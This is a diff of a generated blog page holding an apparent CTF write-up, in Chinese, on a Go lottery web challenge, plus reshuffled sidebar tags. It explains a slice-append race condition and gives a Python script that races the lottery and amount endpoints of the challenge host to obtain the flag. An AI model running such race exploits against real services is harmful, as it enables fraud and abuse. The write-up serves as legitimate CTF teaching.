@@ -394,15 +394,10 @@
 <pre><code>service := app.NewService(ctx, lotteryPeriod, deleteAccountAfter)
 router := transport.InitRouter(service, flag)
 </code></pre><p>service的返回值如代码所示：</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">func</span> <span class="title">NewService</span><span class="params">(ctx context.Context, lotteryPeriod, deleteAccountAfter time.Duration)</span> *<span class="title">Service</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;Service&#123;</span><br><span class="line">		accounts:           <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]Account),</span><br><span class="line">		lottery:            NewLottery(ctx, lotteryPeriod),</span><br><span class="line">		deleteAccountAfter: deleteAccountAfter,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewService</span><span class="params">(ctx context.Context, lotteryPeriod, deleteAccountAfter time.Duration)</span> *<span class="title">Service</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;Service&#123;</span><br><span class="line">		accounts:           <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]Account),</span><br><span class="line">		lottery:            NewLottery(ctx, lotteryPeriod),</span><br><span class="line">		deleteAccountAfter: deleteAccountAfter,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>然后InitRouter里提供了下面的Rest API接口：</p>
-<pre><code>r.Get(&quot;/&quot;, handler.IndexGet)
-r.Post(&quot;/account&quot;, handler.AccountAdd)
-r.Post(&quot;/account/{name}/amount&quot;, handler.AccountAddAmount)
-r.Get(&quot;/account/{name}&quot;, handler.AccountGet)
-r.Post(&quot;/lottery/add&quot;, handler.LotteryAdd)
-r.Get(&quot;/lottery/results&quot;, handler.LotteryResults)
-</code></pre><p>其中的handler.AccountGet方法，当flag变量为true时，将会在请求对应账号的响应里返回flag。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r.Get(<span class="string">"/"</span>, handler.IndexGet)</span><br><span class="line">r.Post(<span class="string">"/account"</span>, handler.AccountAdd)</span><br><span class="line">r.Post(<span class="string">"/account/&#123;name&#125;/amount"</span>, handler.AccountAddAmount)</span><br><span class="line">r.Get(<span class="string">"/account/&#123;name&#125;"</span>, handler.AccountGet)</span><br><span class="line">r.Post(<span class="string">"/lottery/add"</span>, handler.LotteryAdd)</span><br><span class="line">r.Get(<span class="string">"/lottery/results"</span>, handler.LotteryResults)</span><br></pre></td></tr></table></figure>
+<p>其中的handler.AccountGet方法，当flag变量为true时，将会在请求对应账号的响应里返回flag。</p>
 <p><img src="2.png" alt="automne"></p>
 <p>接着跟到h.service.AccountGet方法里</p>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">AccountGet</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="params">(Account, <span class="keyword">bool</span>, error)</span></span> &#123;</span><br><span class="line">	s.mutex.RLock()</span><br><span class="line">	<span class="keyword">defer</span> s.mutex.RUnlock()</span><br><span class="line">	account, found := s.accounts[name]</span><br><span class="line">	<span class="keyword">if</span> !found &#123;</span><br><span class="line">		<span class="keyword">return</span> Account&#123;&#125;, <span class="literal">false</span>, ErrNotFound</span><br><span class="line">	&#125;</span><br><span class="line">	superUser := s.lottery.IsWinner(name) || account.IsMillionaire()</span><br><span class="line">	<span class="keyword">return</span> account, superUser, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -423,11 +418,8 @@ r.Get(&quot;/lottery/results&quot;, handler.LotteryResults)
 <p>要想成为百万富翁，留意到Lottery里的evaluate函数，其中的append()方法有机会将100万添加到账号里。</p>
 <pre><code>amounts := append(account.Amounts, randInt(999913, 3700000))
 </code></pre><p>看一下amounts的类型，是一个数组切片。</p>
-<pre><code>type Account struct {
-    Name    string `json:&quot;name&quot;`
-    Amounts []int  `json:&quot;amounts&quot;`
-}
-</code></pre><p>对于Go里面的数组切片，如果其capacity存在冗余，那么并发写数据的时候，就会存在条件竞争的问题。<br>思路就是先通过handler.AccountAddAmount方法添加三次金额，然后调用handler.LotteryAdd方法和其条件竞争，写入成功即可得到flag。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Account <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name    <span class="keyword">string</span> <span class="string">`json:"name"`</span></span><br><span class="line">	Amounts []<span class="keyword">int</span>  <span class="string">`json:"amounts"`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对于Go里面的数组切片，如果其capacity存在冗余，那么并发写数据的时候，就会存在条件竞争的问题。<br>思路就是先通过handler.AccountAddAmount方法添加三次金额，然后调用handler.LotteryAdd方法和其条件竞争，写入成功即可得到flag。</p>
 <p>脚本如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://lottery.zajebistyc.tf'</span></span><br><span class="line"></span><br><span class="line">names = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">999999</span>):</span><br><span class="line">    r = s.post(url + <span class="string">"/account"</span>).json()</span><br><span class="line">    name = r[<span class="string">'name'</span>]</span><br><span class="line">    names.append(name)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        r = s.post(url + <span class="string">f'/account/<span class="subst">&#123;name&#125;</span>/amount'</span>, json=dict(amount=<span class="number">99</span>))</span><br><span class="line">		</span><br><span class="line">    r = s.get(url + <span class="string">f'/account/<span class="subst">&#123;name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line">    r = s.post(url + <span class="string">f'/lottery/add'</span>, json=dict(accountName=name))</span><br><span class="line"></span><br><span class="line">    r = s.post(url + <span class="string">f'/account/<span class="subst">&#123;name&#125;</span>/amount'</span>, json=dict(amount=<span class="number">87</span>))</span><br><span class="line"></span><br><span class="line">    r = s.get(url + <span class="string">f'/account/<span class="subst">&#123;name&#125;</span>'</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'log'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        print(r.text, file=f)</span><br></pre></td></tr></table></figure>
 <p>得到flag:</p>
@@ -738,12 +730,6 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 14
@@ -850,51 +836,51 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="sha-1"><span class="iconfont-archer">&#xe606;</span>sha-1</span>
     
+        <span class="sidebar-tag-name" data-tags="sqli"><span class="iconfont-archer">&#xe606;</span>sqli</span>
+    
+        <span class="sidebar-tag-name" data-tags="sqlite"><span class="iconfont-archer">&#xe606;</span>sqlite</span>
+    
+        <span class="sidebar-tag-name" data-tags="fat"><span class="iconfont-archer">&#xe606;</span>fat</span>
+    
+        <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
+    
         <span class="sidebar-tag-name" data-tags="luks"><span class="iconfont-archer">&#xe606;</span>luks</span>
     
         <span class="sidebar-tag-name" data-tags="hashcat"><span class="iconfont-archer">&#xe606;</span>hashcat</span>
     
         <span class="sidebar-tag-name" data-tags="photorec"><span class="iconfont-archer">&#xe606;</span>photorec</span>
     
-        <span class="sidebar-tag-name" data-tags="fat"><span class="iconfont-archer">&#xe606;</span>fat</span>
-    
-        <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
-    
-        <span class="sidebar-tag-name" data-tags="sqli"><span class="iconfont-archer">&#xe606;</span>sqli</span>
-    
-        <span class="sidebar-tag-name" data-tags="sqlite"><span class="iconfont-archer">&#xe606;</span>sqlite</span>
-    
         <span class="sidebar-tag-name" data-tags="golang"><span class="iconfont-archer">&#xe606;</span>golang</span>
     
         <span class="sidebar-tag-name" data-tags="race condition"><span class="iconfont-archer">&#xe606;</span>race condition</span>
-    
-        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
         <span class="sidebar-tag-name" data-tags="sso"><span class="iconfont-archer">&#xe606;</span>sso</span>
     
         <span class="sidebar-tag-name" data-tags="oauth 2.0"><span class="iconfont-archer">&#xe606;</span>oauth 2.0</span>
     
-        <span class="sidebar-tag-name" data-tags="frida"><span class="iconfont-archer">&#xe606;</span>frida</span>
+        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
         <span class="sidebar-tag-name" data-tags="volatility"><span class="iconfont-archer">&#xe606;</span>volatility</span>
-    
-        <span class="sidebar-tag-name" data-tags="yara plugin"><span class="iconfont-archer">&#xe606;</span>yara plugin</span>
-    
-        <span class="sidebar-tag-name" data-tags="pwntools"><span class="iconfont-archer">&#xe606;</span>pwntools</span>
-    
-        <span class="sidebar-tag-name" data-tags="nim game"><span class="iconfont-archer">&#xe606;</span>nim game</span>
     
         <span class="sidebar-tag-name" data-tags="malware"><span class="iconfont-archer">&#xe606;</span>malware</span>
     
         <span class="sidebar-tag-name" data-tags="codereflect"><span class="iconfont-archer">&#xe606;</span>codereflect</span>
     
-        <span class="sidebar-tag-name" data-tags="google cloud sdk"><span class="iconfont-archer">&#xe606;</span>google cloud sdk</span>
+        <span class="sidebar-tag-name" data-tags="yara plugin"><span class="iconfont-archer">&#xe606;</span>yara plugin</span>
     
         <span class="sidebar-tag-name" data-tags=".iso"><span class="iconfont-archer">&#xe606;</span>.iso</span>
     
         <span class="sidebar-tag-name" data-tags="gpg"><span class="iconfont-archer">&#xe606;</span>gpg</span>
     
         <span class="sidebar-tag-name" data-tags="outguess"><span class="iconfont-archer">&#xe606;</span>outguess</span>
+    
+        <span class="sidebar-tag-name" data-tags="frida"><span class="iconfont-archer">&#xe606;</span>frida</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwntools"><span class="iconfont-archer">&#xe606;</span>pwntools</span>
+    
+        <span class="sidebar-tag-name" data-tags="nim game"><span class="iconfont-archer">&#xe606;</span>nim game</span>
+    
+        <span class="sidebar-tag-name" data-tags="google cloud sdk"><span class="iconfont-archer">&#xe606;</span>google cloud sdk</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -931,9 +917,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="Android"><span class="iconfont-archer">&#xe60a;</span>Android</span>
     
-        <span class="sidebar-category-name" data-categories="Forensics"><span class="iconfont-archer">&#xe60a;</span>Forensics</span>
-    
         <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
+    
+        <span class="sidebar-category-name" data-categories="Forensics"><span class="iconfont-archer">&#xe60a;</span>Forensics</span>
     
         <span class="sidebar-category-name" data-categories="Misc"><span class="iconfont-archer">&#xe60a;</span>Misc</span>
     
